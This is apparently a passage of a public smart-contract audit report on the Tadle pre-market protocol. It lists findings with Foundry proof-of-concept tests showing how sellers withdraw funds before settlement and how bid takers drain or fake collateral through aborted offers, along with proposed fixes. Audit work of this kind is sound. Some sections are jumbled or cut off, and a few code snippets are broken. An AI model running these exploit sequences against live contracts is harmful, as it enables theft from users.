    if (marketPlaceInfo.fixedratio) { 
        revert FixedRatioUnsupported(); 
    } 
    //  
    if (offerInfo.offerType == OfferType.Bid) { 
        revert InvalidOfferType(OfferType.Ask, OfferType.Bid); 
    } 
    if ( 
        offerInfo.offerStatus != OfferStatus.Virgin && 
        offerInfo.offerStatus != OfferStatus.Canceled 
    ) { 
        revert InvalidOfferStatus(); 
    } 
    if (status == MarketPlaceStatus.AskSettling) { 
        if (_msgSender() != offerInfo.authority) { 
            revert Errors.Unauthorized(); 
        } 
    } else { 
        if (_msgSender() != owner()) { 
            revert Errors.Unauthorized(); 
        } 
        if (_settledPoints > 0) { 
            revert InvalidPoints(); 
        } 
    } 
    // Calculate the token amount 
    uint256 settledPointTokenAmount = marketPlaceInfo.tokenPerPoint * 
        _settledPoints; 
    ITokenManager tokenManager = tadleFactory.getTokenManager(); 
    if (settledPointTokenAmount > 0) { 
        tokenManager.tillIn( 
            _msgSender(), 
            marketPlaceInfo.tokenAddress, 
            settledPointTokenAmount, 
            true 
        ); 
    } 
    uint256 makerRefundAmount; 
    // The maker can receive their collateral if they pay enough point token. 
    if (_settledPoints == offerInfo.usedPoints) { 
        if (offerInfo.offerStatus == OfferStatus.Virgin) { 
            makerRefundAmount = OfferLibraries.getDepositAmount( 
                offerInfo.offerType, 
                offerInfo.collateralRate, 
                offerInfo.amount, 
                true, 
                Math.Rounding.Floor 
            ); 
        } else { 
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
uint256 usedAmount = offerInfo.amount.mulDiv( 
    offerInfo.usedPoints, 
    offerInfo.points, 
    Math.Rounding.Floor 
); 
makerRefundAmount = OfferLibraries.getDepositAmount( 
    offerInfo.offerType, 
    offerInfo.collateralRate, 
    usedAmount, 
    true, 
    Math.Rounding.Floor 
); 

tokenManager.addTokenBalance( 
    // @audit-fp [L] improper balance type 
    TokenBalanceType.SalesRevenue, 
    _msgSender(), 
    makerInfo.tokenAddress, 
    makerRefundAmount 
); 

IPerMarkets perMarkets = tadleFactory.getPerMarkets(); 
perMarkets.settledAskOffer( 
    _offer, 
    _settledPoints, 
    settledPointTokenAmount 
);
\u0060\u0060\u0060

In below test case, user2 is not the maker, users buy points and resell points. When the marketplace\u0027s status is changed to the asksettle status, users can settle his offer to get back some collaterals.
## Maker\u0027s Collateral Withdrawal
**Impact**  
Maker\u0027s collateral will be withdrawn by others. Makers may have to take the loss.

**Tools Used**  
Manual

**Recommendations**  
In turbo mode, only the maker or the original offer\u0027s owner can trigger \u0060settleAskMaker()\u0060.
Submitted by [wellbyt3](https://profiles.cyfrin.io/u/wellbyt3), [Tomas0707](https://profiles.cyfrin.io/u/Tomas0707), [joicygiore](https://profiles.cyfrin.io/u/joicygiore), [eeyore](https://profiles.cyfrin.io/u/eeyore), [h2134](https://profiles.cyfrin.io/u/h2134), [oxelmiguel](https://profiles.cyfrin.io/u/oxelmiguel), [0xnbvc](https://profiles.cyfrin.io/u/0xnbvc), [emanherawy](https://profiles.cyfrin.io/u/emanherawy), [meeve](https://profiles.cyfrin.io/u/meeve), [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe), [krisrenzo](https://profiles.cyfrin.io/u/krisrenzo), [kamensec](https://profiles.cyfrin.io/u/kamensec), [amaron](https://profiles.cyfrin.io/u/amaron), [bladesec](https://profiles.cyfrin.io/u/bladesec), [_frolic](https://profiles.cyfrin.io/u/_frolic), [gkrastenov](https://profiles.cyfrin.io/u/gkrastenov). Selected submission by: [oxelmiguel](https://profiles.cyfrin.io/u/oxelmiguel).

The goal of the protocol is to facilitate pre-market trading by allowing sellers to list points at their desired prices and enabling buyers to purchase these assets before their official launch. After the Token Generation Event (TGE), sellers are required to deliver the corresponding tokens to buyers at the pre-listed prices, ensuring that pre-market agreements are honored and enhancing overall market liquidity. [More details](https://tadle.gitbook.io/tadle/how-tadle-works/features-and-terminologies/settlement-and-collateral-rate)

Sellers will receive their initial collateral back along with the buyer\u0027s funds only after completing the settlement. Buyers will receive the equivalent tokens, and their funds will be transferred to the sellers. If sellers fail to complete the settlement within the allotted time, they will forfeit their collateral. Buyers can claim compensation from the seller’s collateral as stored in the smart contract.
## Vulnerabilities details

The protocol currently allows sellers to withdraw buyer’s funds and tax fees before completing the settlement, which can lead to sellers avoiding their settlement obligations without losing their collateral, leaving buyers without compensation.

This issue arises because:
When a buyer purchases points, the amount (salesRevenue) and tax fee become immediately available for withdrawal to seller. 

The createTaker function processes the deposit and tax fee transfer: [View code](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L164)
The \u0060createTaker\u0060 function is defined as follows:

\u0060\u0060\u0060solidity
function createTaker(address _offer, uint256 _points) external payable { 
    /*
        ... 
    */
    ITokenManager tokenManager = tadleFactory.getTokenManager(); 
    _depositTokenWhenCreateTaker( 
        platformFee, 
        depositAmount, 
        tradeTax, 
        makerInfo, 
        offerInfo, 
        tokenManager 
    );
    /*
        ... 
    */
    _updateTokenBalanceWhenCreateTaker( 
        _offer, 
        tradeTax, 
        depositAmount, 
        offerInfo, 
        makerInfo, 
        tokenManager 
    );
    /*
        ... 
    */
}
\u0060\u0060\u0060

The \u0060_depositTokenWhenCreateTaker\u0060 function transfers funds from the buyer to the capital pool. The \u0060_updateTokenBalanceWhenCreateTaker\u0060 function then enables the seller to withdraw the trade tax and deposit amount:

[Link to Code](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L906)
## Ability for Sellers to Withdraw Funds Before Settlement

The ability for sellers to withdraw these funds before settlement means they can evade their obligations without any penalty, while buyers may not receive the tokens they paid for.

#### Scenario 1
1. Alice Creates an Ask Offer in Turbo Mode:
   - Collateral: 10,000 USDC
   - Points Listed: 1,000
   - Collateral Rate: 10_000 (so Alice deposits exactly 10,000 USDC)
2. Bob Purchases Points:
   - Points Bought: 500
   - Collateral Reserved: 5,000 USDC
3. Dany Purchases Points:
   - Points Bought: 500
   - Collateral Reserved: 5,000 USDC
## Alice Withdraws Funds:
- **Amount Withdrawn:** 10,000 USDC + 300 USCD (taxFee)

### 1. Post-TGE Obligation:
- **Alice Must Settle:** 500 points for Bob and 500 points for Dany.

**Issue:** If the value of 1,000 points in PointToken increases to 15,000 USDC after the TGE, Alice might choose not to settle her obligations. Having already withdrawn 10,300 USDC, she faces no penalty for failing to deliver the tokens and gains an additional 300 USDC. Meanwhile, Bob and Dany would not receive the tokens they paid for, and they would lose their tax fee and any potential compensation. This undermines the protocol’s integrity and leaves buyers unprotected.

### Working Test Case
\u0060\u0060\u0060solidity
function test_ask_custom() public { 
    //create the three user and deal then usdc 
    address alice = vm.addr(10); 
    address bob = vm.addr(11); 
    address dany = vm.addr(12); 
    deal(address(mockUSDCToken), alice, 10000 ); 
    deal(address(mockUSDCToken), bob, 100000 ); 
    deal(address(mockUSDCToken), dany, 100000 ); 
    // alice create an ask offer 
    vm.startPrank(alice); 
    mockUSDCToken.approve(address(tokenManager), type(uint256).max); 
    preMarktes.createOffer( 
        CreateOfferParams( 
            marketPlace, 
            address(mockUSDCToken), 
            1000, 
            10000, 
            10000, 
            300, 
            OfferType.Ask, 
            OfferSettleType.Turbo 
        ) 
    );
    address aliceOffr = GenerateAddress.generateOfferAddress(0); 
    address aliceStock = GenerateAddress.generateStockAddress(0); 
    vm.stopPrank(); 
    // bob buy 500 point 
    vm.startPrank(bob); 
    mockUSDCToken.approve(address(tokenManager), type(uint256).max); 
    preMarktes.createTaker(aliceOffr, 500); 
    address bobStock = GenerateAddress.generateStockAddress(1); 
    vm.stopPrank(); 
    // dany buy 500 point 
    vm.startPrank(dany); 
    mockUSDCToken.approve(address(tokenManager), type(uint256).max); 
    preMarktes.createTaker(aliceOffr, 500); 
    address danyStock = GenerateAddress.generateStockAddress(2); 
    vm.stopPrank(); 
    // alice call withdraw and get salesRevenue and TaxIncome before settlement 
    vm.startPrank(alice); 
    tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.SalesRevenue); 
    tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.TaxIncome); 
    vm.stopPrank(); 
    assertEq(mockUSDCToken.balanceOf(alice), 10300); 
}
\u0060\u0060\u0060
## Alice Creates a Bid Offer in Turbo Mode:
- **Collateral:** 10,000 USDC
- **Points Listed:** 1,000

## Bob Sells Points to Alice:
- **Points Sold:** 1,000
- **Collateral Reserved:** 10,000 USDC

## Bob Withdraws Funds:
- **Amount Withdrawn:** 10,000 USDC

The ability for sellers to withdraw buyer\u0027s funds and tax fees before completing the settlement poses a significant risk to the integrity of the Tadle protocol. This vulnerability allows sellers to evade their settlement obligations, leaving buyers without the tokens they paid for and without any form of compensation. This not only compromises the trustworthiness of the platform but also deters potential participants, reducing market liquidity and participation.

- **Restrict Withdrawal Before Settlement:** Modify the smart contract to prevent sellers from withdrawing any funds, including the sales revenue and collateral, before they have successfully completed their settlement obligations or they aborted or canceled their offer.

### Example
Implement a new mapping and adjust the \u0060addTokenBalance\u0060 function as follows:

\u0060\u0060\u0060solidity
function addTokenBalance( 
    TokenBalanceType _tokenBalanceType, 
    address _accountAddress, 
    address _tokenAddress, 
    uint256 _amount, 
    bool withdrawAllow 
) external onlyRelatedContracts(tadleFactory, _msgSender()) { 
    userTokenBalanceMap[_accountAddress][_tokenAddress][ 
        _tokenBalanceType 
    ] += _amount; 
    withdrawAllowMap[_accountAddress][_tokenAddress][ 
        _tokenBalanceType 
    ] = withdrawAllow; 
    emit AddTokenBalance( 
        _accountAddress, 
        _tokenAddress, 
        _tokenBalanceType, 
        _amount, 
        withdrawAllow 
    );
}
\u0060\u0060\u0060

In the withdraw function, add a check to enforce this restriction:

\u0060\u0060\u0060solidity
bool withdrawAllow = withdrawAllowMap[_msgSender()][ 
    _tokenAddress 
][_tokenBalanceType]; 
if (!withdrawAllow) { 
    revert Errors.Unauthorized(); 
}
\u0060\u0060\u0060

Update the \u0060withdrawAllowMap\u0060 in the settlement function to allow users to withdraw their funds only after fulfilling their obligations. If a user fails to settle, they should be prevented from withdrawing any funds they are not allowed to.
Submitted by [touthang](https://profiles.cyfrin.io/u/touthang), [fyamf](https://profiles.cyfrin.io/u/fyamf), [radin100](https://profiles.cyfrin.io/u/radin100), [eeyore](https://profiles.cyfrin.io/u/eeyore), [robertodf99](https://profiles.cyfrin.io/u/robertodf99), [inzinko](https://profiles.cyfrin.io/u/inzinko), [honour](https://profiles.cyfrin.io/u/honour), [stanchev](https://profiles.cyfrin.io/u/stanchev), [kupiasec](https://profiles.cyfrin.io/u/kupiasec), [azanux](https://profiles.cyfrin.io/u/azanux). Selected submission by: [robertodf99](https://profiles.cyfrin.io/u/robertodf99).

When the ask makers abort offers their status is changed to Settled in function \u0060PreMarkets::abortAskOffer\u0060:

\u0060\u0060\u0060solidity
offerInfo.abortOfferStatus = AbortOfferStatus.Aborted; 
offerInfo.offerStatus = OfferStatus.Settled; 
\u0060\u0060\u0060

Therefore bid takers can close the bid offers by calling \u0060DeliveryPlace::closeBidTaker\u0060 since the only offer status check is the following:

\u0060\u0060\u0060solidity
if (offerInfo.offerStatus != OfferStatus.Settled) { 
    revert InvalidOfferStatus(); 
} 
\u0060\u0060\u0060

If the ask maker has not settled the offer, the collateral corresponding to the points purchased by the bid taker will be sent as a penalty. However, since the collateral has already been returned (except for the portion representing the profit from the sale that belongs to the bid taker), the additional amount sent to the bid taker will be taken from another user.

\u0060\u0060\u0060solidity
uint256 collateralFee; 
if (offerInfo.usedPoints > offerInfo.settledPoints) { 
    if (offerInfo.offerStatus == OfferStatus.Virgin) { 
        collateralFee = OfferLibraries.getDepositAmount( 
            offerInfo.offerType, 
            offerInfo.collateralRate, 
            offerInfo.amount, 
            true, 
            Math.Rounding.Floor 
        ); 
    } else { 
        uint256 usedAmount = offerInfo.amount.mulDiv( 
            offerInfo.usedPoints, 
            offerInfo.points, 
            Math.Rounding.Floor 
        ); 
        collateralFee = OfferLibraries.getDepositAmount( 
            offerInfo.offerType, 
            offerInfo.collateralRate, 
            usedAmount, 
            true, 
            Math.Rounding.Floor 
        ); 
    } 
} 
uint256 userCollateralFee = collateralFee.mulDiv( 
    userRemainingPoints, 
    offerInfo.usedPoints, 
    Math.Rounding.Floor 
);
tokenManager.addTokenBalance( 
    TokenBalanceType.RemainingCash, 
    _msgSender(), 
    makerInfo.tokenAddress, 
    userCollateralFee 
);
\u0060\u0060\u0060
This collateral fee includes the original amount the bid taker provided, plus an additional fee calculated based on the collateral rate set by the ask maker. This amount would be paid twice but deposited only once.

Bid takers would be stealing the amount above the offer amount corresponding to the points bought, i.e., the additional collateral ratio set by the offer maker, since their original deposit had a unit collateral rate:

\[
\text{stolen amount} = \frac{(\text{collateralRate}-1) \cdot \text{userRemainingPoints} \cdot \text{offerInfo.amount}}{\text{offerInfo.usedPoints}}
\]

Refer to PoC for an example:

\u0060\u0060\u0060solidity
function test_bid_taker_closes_aborted_offer() public { 
    vm.startPrank(user); 
    preMarktes.createOffer( 
        CreateOfferParams( 
            marketPlace, 
            address(mockUSDCToken), 
            1000, 
            0.01 * 1e18, 
            12000, 
            300, 
            OfferType.Ask, 
            OfferSettleType.Turbo 
        ) 
    );
    vm.stopPrank(); 
    vm.startPrank(user1); 
    mockUSDCToken.approve(address(tokenManager), type(uint256).max); 
    address stockAddr = GenerateAddress.generateStockAddress(0); 
    address offerAddr = GenerateAddress.generateOfferAddress(0); 
    preMarktes.createTaker(offerAddr, 500); 
    vm.stopPrank(); 
    vm.prank(user); 
    preMarktes.abortAskOffer(stockAddr, offerAddr); 
    address stock1Addr = GenerateAddress.generateStockAddress(1); 
    vm.prank(user1); 
    // closes aborted offer before settlement period and gets additional 0.2*0.005*1e18 USDC 
    deliveryPlace.closeBidTaker(stock1Addr); 
    assertEq( 
        tokenManager.userTokenBalanceMap( 
            user1, 
            address(mockUSDCToken), 
            TokenBalanceType.RemainingCash 
        ), 
        (((0.01 * 1e18) / 2) * 12000) / 10000 
    );
}
\u0060\u0060\u0060

Manual review.
Submitted by [robertodf99](https://profiles.cyfrin.io/u/robertodf99), [fyamf](https://profiles.cyfrin.io/u/fyamf), [0xlamide](https://profiles.cyfrin.io/u/0xlamide), [0xlookman](https://profiles.cyfrin.io/u/0xlookman). Selected submission by: [robertodf99](https://profiles.cyfrin.io/u/robertodf99).

A missing validation check in \u0060PreMarkets::listOffer\u0060 allows bid takers to relist aborted stock, which, in an offer operating in turbo mode, results in offers with no collateral backing. Due to another issue, bid takers may be compensated using other users\u0027 tokens, as the user relisting the offer faces no penalties.

If an ask maker chooses to abort their offer, bid takers can also abort their participation by calling \u0060PreMarkets::abortBidTaker\u0060. This returns the tokens originally sent to the ask maker when the offer was created, effectively ending the buy-sell relationship with no further liabilities. However, if the bid taker (now acting as the ask maker) is allowed to relist the offer by calling \u0060PreMarkets::listOffer\u0060 while the offer is in turbo mode, a new, unbacked offer is created. This offer lacks any collateral or liability, allowing the bid taker (now the ask maker) to receive tokens from a new taker without having to settle any point tokens. No penalties can be applied since no collateral was locked in the protocol.

Refer to the example PoC, where user acts as the original maker, user1 as the first taker who then lists the unbacked offer for sale, and user2 as the user who takes the unbacked bid offer:
## Test Function: \u0060test_relist_aborted_offer\u0060

\u0060\u0060\u0060solidity
function test_relist_aborted_offer() public { 
    vm.startPrank(user); 
    preMarktes.createOffer( 
        CreateOfferParams( 
            marketPlace, 
            address(mockUSDCToken), 
            1000, 
            0.01 * 1e18, 
            12000, 
            300, 
            OfferType.Ask, 
            OfferSettleType.Turbo 
        ) 
    );
    vm.stopPrank(); 
    vm.startPrank(user1); 
    mockUSDCToken.approve(address(tokenManager), type(uint256).max); 
    address stockAddr = GenerateAddress.generateStockAddress(0); 
    address offerAddr = GenerateAddress.generateOfferAddress(0); 
    preMarktes.createTaker(offerAddr, 500); 
    vm.stopPrank(); 
    // Abort offers 
    vm.prank(user); 
    preMarktes.abortAskOffer(stockAddr, offerAddr); 
    vm.startPrank(user1); 
    address stock1Addr = GenerateAddress.generateStockAddress(1); 
    preMarktes.abortBidTaker(stock1Addr, offerAddr); 
    // Relist aborted offer and create taker 
    preMarktes.listOffer(stock1Addr, 0.01 * 1e18, 12000); 
    vm.stopPrank(); 
    address offer1Addr = GenerateAddress.generateOfferAddress(1); 
    vm.prank(user2); 
    preMarktes.createTaker(offer1Addr, 500); 
    address stock2Addr = GenerateAddress.generateStockAddress(2); 
    vm.prank(user1); 
    systemConfig.updateMarket( 
        "Backpack", 
        address(mockPointToken), 
        0.01 * 1e18, 
        block.timestamp - 1, 
        3600 
    );
    vm.startPrank(user2); 
    deliveryPlace.closeBidTaker(stock2Addr); 
    console2.log( 
        tokenManager.userTokenBalanceMap( 
            user, 
            address(mockUSDCToken), 
            TokenBalanceType.RemainingCash 
        ) 
    );
    // Capital pool is empty because the offers were previously aborted 
    vm.expectRevert(abi.encodeWithSignature("TransferFailed()")); 
    tokenManager.withdraw( 
        address(mockUSDCToken), 
        TokenBalanceType.RemainingCash 
    );
}
\u0060\u0060\u0060
Manual review.

Add missing check in PreMarkets::listOffer forcing bid takers to abort their offer if the maker aborted when operating in turbo mode:
\u0060\u0060\u0060solidity
if (makerInfo.offerSettleType == OfferSettleType.Turbo) { 
    address originOffer = makerInfo.originOffer; 
    OfferInfo memory originOfferInfo = offerInfoMap[originOffer]; 
    if (originOfferInfo.abortOfferStatus == AbortOfferStatus.Aborted) { 
        revert("Origin offer aborted"); 
    }
    if (_collateralRate != originOfferInfo.collateralRate) { 
        revert InvalidCollateralRate(); 
    }
    originOfferInfo.abortOfferStatus = AbortOfferStatus.SubOfferListed; 
} 
\u0060\u0060\u0060
Note that it is not necessary to implement the check for protected offers since bid takers will need to deposit collateral when listing the offer, therefore if they decide to abort, they will still need to provide the point tokens, otherwise their collateral will be sent to the new bid takers.
## M-01. Unnecessary balance checks and precision issues in TokenManager::_transfer
Submitted by justawanderkid (https://profiles.cyfrin.io/u/justawanderkid), matejdb (https://profiles.cyfrin.io/u/matejdb), salem (https://profiles.cyfrin.io/u/salem), boringslav (https://profiles.cyfrin.io/u/boringslav), 0x5chn0uf (https://profiles.cyfrin.io/u/0x5chn0uf), 0x0n0m4d (https://profiles.cyfrin.io/u/0x0n0m4d), pandasec (https://profiles.cyfrin.io/u/pandasec), MSaptarshi007 (https://profiles.cyfrin.io/u/MSaptarshi007), galturok (https://profiles.cyfrin.io/u/galturok), 4rdiii (https://profiles.cyfrin.io/u/4rdiii), noone7777 (https://profiles.cyfrin.io/u/noone7777), tachida2k (https://profiles.cyfrin.io/u/tachida2k), nave765 (https://profiles.cyfrin.io/u/nave765), charlescheerful (https://profiles.cyfrin.io/u/charlescheerful), eta (https://profiles.cyfrin.io/u/eta), mikebello (https://profiles.cyfrin.io/u/mikebello), oxwhite (https://profiles.cyfrin.io/u/oxwhite), karanel (https://profiles.cyfrin.io/u/karanel), y4y (https://profiles.cyfrin.io/u/y4y), izcoser (https://profiles.cyfrin.io/u/izcoser), 0xnbvc (https://profiles.cyfrin.io/u/0xnbvc), hlx (https://profiles.cyfrin.io/u/hlx), 0xasp (https://profiles.cyfrin.io/u/0xasp), joshuajee (https://profiles.cyfrin.io/u/joshuajee), namx05 (https://profiles.cyfrin.io/u/namx05), robertodf99 (https://profiles.cyfrin.io/u/robertodf99), almantare (https://profiles.cyfrin.io/u/almantare), jesjupyter (https://profiles.cyfrin.io/u/jesjupyter), 0xgenaudits (https://profiles.cyfrin.io/u/0xgenaudits), bube (https://profiles.cyfrin.io/u/bube), 0xleadwizard (https://profiles.cyfrin.io/u/0xleadwizard), praise03 (https://profiles.cyfrin.io/u/praise03), vineyard (https://profiles.cyfrin.io/u/vineyard), pina (https://profiles.cyfrin.io/u/pina), nikhil20 (https://profiles.cyfrin.io/u/nikhil20), 0xbeastboy (https://profiles.cyfrin.io/u/0xbeastboy), silentwalker (https://profiles.cyfrin.io/u/silentwalker), dimi6oni (https://profiles.cyfrin.io/u/dimi6oni), VaRuN (https://profiles.cyfrin.io/u/VaRuN), Ward (https://codehawks.cyfrin.io/team/clr5ch8nz0001whgxzd0o1ecx), 0xpep7 (https://profiles.cyfrin.io/u/0xpep7), ali9896546 (https://profiles.cyfrin.io/u/ali9896546), flyingbird (https://profiles.cyfrin.io/u/flyingbird), atharv181 (https://profiles.cyfrin.io/u/atharv181), rbserver (https://profiles.cyfrin.io/u/rbserver), radin100 (https://profiles.cyfrin.io/u/radin100), 0xdemon (https://profiles.cyfrin.io/u/0xdemon), krisrenzo (https://profiles.cyfrin.io/u/krisrenzo), 0x1912 (https://profiles.cyfrin.io/u/0x1912), 0xshoonya (https://profiles.cyfrin.io/u/0xshoonya), vinica_boy (https://profiles.cyfrin.io/u/vinica_boy), 4eyes (https://codehawks.cyfrin.io/team/clzp933py000dnn0wn5ui2a7b), zer0 (https://profiles.cyfrin.io/u/zer0), 0xrishi (https://profiles.cyfrin.io/u/0xrishi), 456456 (https://profiles.cyfrin.io/u/456456), demorextess (https://profiles.cyfrin.io/u/demorextess), kupiasec (https://profiles.cyfrin.io/u/kupiasec), zukanopro (https://profiles.cyfrin.io/u/zukanopro), anonymousjoe (https://profiles.cyfrin.io/u/anonymousjoe), amaron (https://profiles.cyfrin.io/u/amaron), c0pp3rscr3w3r (https://profiles.cyfrin.io/u/c0pp3rscr3w3r). Selected submission by: 0x5chn0uf (https://profiles.cyfrin.io/u/0x5chn0uf).

The TokenManager::_transfer function performs unnecessary balance checks before and after the transfer. Additionally, it uses exact equality checks for balance differences, which can cause issues with tokens that have transfer fees or unusual rounding behaviors.

The _transfer function performs balance checks that are typically handled by the ERC20 token itself:
## Transfer Checks Vulnerability

\u0060\u0060\u0060solidity
function _transfer( 
    address _token, 
    address _from, 
    address _to, 
    uint256 _amount, 
    address _capitalPoolAddr 
) internal { 
    // ...
}
if (fromBalanceAft != fromBalanceBef - _amount) { 
    revert TransferFailed(); 
}
if (toBalanceAft != toBalanceBef + _amount) { 
    // ... 
}
\u0060\u0060\u0060

These checks can cause issues with tokens that have transfer fees or non-standard implementations. The test case demonstrates this issue: (to be inserted in PreMarkets.t.sol)
## MockTokenWithFee Contract Vulnerabilities

\u0060\u0060\u0060solidity
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol"; 
import {Rescuable} from "../src/utils/Rescuable.sol"; 

// Mock token contract with a 1% transfer fee 
contract MockTokenWithFee is ERC20 { 
    constructor() ERC20("MockFeeToken", "MFT") {} 

    function approve( 
        address spender, 
        uint256 amount 
    ) public virtual override returns (bool) { 
        _approve(_msgSender(), spender, amount); 
        return true; 
    }

    function transfer( 
        address recipient, 
        uint256 amount 
    ) public virtual override returns (bool) { 
        uint256 fee = amount / 100; // 1% fee 
        uint256 amountAfterFee = amount - fee; 
        _transfer(_msgSender(), recipient, amountAfterFee); 
        _transfer(_msgSender(), address(this), fee); // Fee goes to the contract 
        return true; 
    }

    function transferFrom( 
        address sender, 
        address recipient, 
        uint256 amount 
    ) public virtual override returns (bool) { 
        uint256 fee = amount / 100; // 1% fee 
        uint256 amountAfterFee = amount - fee; 
        _transfer(sender, recipient, amountAfterFee); 
        _transfer(sender, address(this), fee); // Fee goes to the contract 
        uint256 currentAllowance = allowance(sender, _msgSender()); 
        require( 
            currentAllowance >= amount, 
            "ERC20: transfer amount exceeds allowance" 
        );
        unchecked { 
            _approve(sender, _msgSender(), currentAllowance - amount); 
        } 
        return true; 
    }
} 

function testPrecisionIssue() public { 
    // Setup 
    uint256 initialBalance = 100 * 10 ** 18; // 100 tokens 
    // Deploy a mock token with a 1% transfer fee 
    MockTokenWithFee mockToken = new MockTokenWithFee(); 
    vm.prank(user); 
    mockToken.approve(address(tokenManager), initialBalance); 
    deal(address(mockToken), address(user), initialBalance); 
    // Atempting to "till in" fails 
    vm.expectRevert(Rescuable.TransferFailed.selector); 
    vm.prank(address(preMarktes)); 
    tokenManager.tillIn(user, address(mockToken), initialBalance, true); 
    // Check balances 
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
uint256 userBalance = mockToken.balanceOf(user); 
assertEq( 
    userBalance, 
    initialBalance, 
    "User\u0027s balance should be the same as the initial balance" 
); 
uint256 userTokenBalance = tokenManager.userTokenBalanceMap( 
    user, 
    address(mockToken), 
    TokenBalanceType.SalesRevenue 
); 
assertEq( 
    userTokenBalance, 
    0,
    "User\u0027s balance in TokenManager should be 0" 
); 
assertEq( 
    mockToken.balanceOf(address(capitalPool)), 
    0,
    "The balance of the token in the capital pool should be 0" 
); 
\u0060\u0060\u0060

- Potential for failed transfers when using tokens with transfer fees or non-standard implementations.
- Users may be unable to withdraw their funds if using tokens with transfer fees.
- Users may be unable to send their funds if using tokens with transfer fees.

- Manual Review - Testing

1. Remove the unnecessary balance checks in the _transfer function.
2. Instead of using exact equality checks, implement a tolerance threshold for balance differences to account for potential transfer fees or rounding issues.
3. Consider using OpenZeppelin\u0027s SafeERC20 library for safer token transfers.

Here\u0027s an example of how the _transfer function could be improved:
## M-02. WrappedNativeToken Can Only Work in NativeToken Mode

Submitted by auditweiler (https://profiles.cyfrin.io/u/auditweiler), matejdb (https://profiles.cyfrin.io/u/matejdb), pandasec (https://profiles.cyfrin.io/u/pandasec), gajiknownnothing (https://profiles.cyfrin.io/u/gajiknownnothing), bauchibred (https://profiles.cyfrin.io/u/bauchibred), jesjupyter (https://profiles.cyfrin.io/u/jesjupyter), 4eyes (https://codehawks.cyfrin.io/team/clzp933py000dnn0wn5ui2a7b), 0xlamide (https://profiles.cyfrin.io/u/0xlamide), cryptomoon (https://profiles.cyfrin.io/u/cryptomoon), zer0 (https://profiles.cyfrin.io/u/zer0), kupiasec (https://profiles.cyfrin.io/u/kupiasec). Selected submission by: jesjupyter (https://profiles.cyfrin.io/u/jesjupyter).

In the TokenManager::tillIn function, if _tokenAddress is equal to wrappedNativeToken, the function directly assumes that a native token is being used and checks msg.value for sufficient funds. This approach limits the functionality of wrappedNativeToken when it is used as an ERC-20 token, leading to unintended transaction reverts even when the user has approved sufficient funds.

The TokenManager::tillIn function has a conditional check that determines if the _tokenAddress is equal to wrappedNativeToken. If this condition is met, the function assumes that the transaction involves the native token (e.g., ETH) and checks if msg.value is greater than or equal to _amount. If msg.value is insufficient, the transaction reverts:

\u0060\u0060\u0060solidity
if (_tokenAddress == wrappedNativeToken) { 
    /** 
     * @dev token is native token 
     * @notice check msg value 
     * @dev if msg value is less than _amount, revert 
     * @dev wrap native token and transfer to capital pool 
     */ 
    if (msg.value < _amount) { 
        revert Errors.NotEnoughMsgValue(msg.value, _amount); 
    } 
    IWrappedNativeToken(wrappedNativeToken).deposit{value: _amount}(); 
    _safe_transfer(wrappedNativeToken, capitalPoolAddr, _amount); 
}
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
function _transfer( 
    address _token, 
    address _from, 
    address _to, 
    uint256 _amount, 
    address _capitalPoolAddr 
) internal { 
    uint256 fromBalanceBef = IERC20(_token).balanceOf(_from); 
    uint256 toBalanceBef = IERC20(_token).balanceOf(_to); 
    if ( 
        _from == _capitalPoolAddr && 
        IERC20(_token).allowance(_from, address(this)) == 0 
    ) { 
        ICapitalPool(_capitalPoolAddr).approve(address(this)); 
    }
    uint256 balanceBefore = IERC20(_token).balanceOf(_to); 
    _safe_transfer_from(_token, _from, _to, _amount); 
    uint256 balanceAfter = IERC20(_token).balanceOf(_to); 
    uint256 receivedAmount = balanceAfter - balanceBefore; 
    require(receivedAmount > 0, "Transfer failed"); 
}
\u0060\u0060\u0060
## Wrapped Native Token Handling

This implementation does not consider cases where wrappedNativeToken (e.g., WETH) is being used as a regular ERC-20 token in functions like PreMarkets::createOffer. In such cases, even if the user has already approved sufficient WETH, the transaction would still revert due to the insufficient msg.value, causing unintended reverts.

Consider the following case:
1. A user intends to use wrappedNativeToken (e.g., WETH) directly in PreMarkets::createOffer.
2. Despite having approved enough WETH, the transaction would still revert because msg.value does not match the _amount required, leading to an unintended failure.

This issue restricts the flexibility of using wrappedNativeToken as an ERC-20 token and can lead to unintended transaction failures. Users attempting to interact with the contract using wrappedNativeToken, which is a normal/frequent case, may face unexpected reverts, hindering the user experience and limiting contract functionality.

- Manual

To address this issue, it is recommended to introduce a separate address that explicitly represents the native token (e.g., ETH). For example, the commonly used address \u00600xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee\u0060 could be utilized to signify the native token. The condition should then differentiate between wrappedNativeToken (used as an ERC-20 token) and the native token (ETH) itself.
## M-03. mulDiv() Can Round Down to 0 in Realistic Cases, Allowing for Tax Avoidance

Submitted by [bengalcatbalu](https://profiles.cyfrin.io/u/bengalcatbalu), [h2134](https://profiles.cyfrin.io/u/h2134), [MSaptarshi007](https://profiles.cyfrin.io/u/MSaptarshi007), [charlescheerful](https://profiles.cyfrin.io/u/charlescheerful), [krisrenzo](https://profiles.cyfrin.io/u/krisrenzo), [ni8mare](https://profiles.cyfrin.io/u/ni8mare), [aresaudits](https://profiles.cyfrin.io/u/aresaudits). Selected submission by: [charlescheerful](https://profiles.cyfrin.io/u/charlescheerful).

The code uses unsafely the \u0060.mulDiv()\u0060 function; this function ultimately does: \u0060number * numerator / denominator\u0060. There are realistic scenarios where: \u0060number * numerator < denominator\u0060 and the division truncates to 0. This can ultimately be used to avoid taxes with some tokens or avoid platform fees too. Referral codes can potentially get affected by this too.

Trade tax is calculated like so:
\u0060\u0060\u0060solidity
uint256 tradeTax = depositAmount.mulDiv(makerInfo.eachTradeTax, Constants.EACH_TRADE_TAX_DECIMAL_SCALER);
\u0060\u0060\u0060
Which in math is: \u0060depositAmount * makerInfo.eachTradeTax / Constants.EACH_TRADE_TAX_DECIMAL_SCALER\u0060. 

